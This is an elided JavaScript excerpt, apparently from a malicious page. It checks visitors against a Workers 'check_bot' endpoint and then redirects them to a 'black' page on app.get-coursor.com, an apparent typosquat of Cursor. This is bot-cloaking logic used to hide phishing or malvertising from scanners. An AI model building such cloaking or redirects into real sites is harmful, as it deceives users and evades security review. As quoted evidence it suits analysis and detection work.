...
window.addEventListener('DOMContentLoaded', () => {
  ...
  const workerURL = 'https://green-salad-b336.oyiluwiwu10.workers.dev/loader/api/check_bot' + qs;
  ...
  fetch(workerURL)
    ...
    .then(res => {
      ...
      if (force) {
        ...
        showBlack((res.campaign || 'https://app.get-coursor.com/66Fpqt5X') + qs);
        return;
      }
    ...
    .catch(e => {
      ...
      showBlack('https://app.get-coursor.com/66Fpqt5X' + (location.search || ''));
    });
});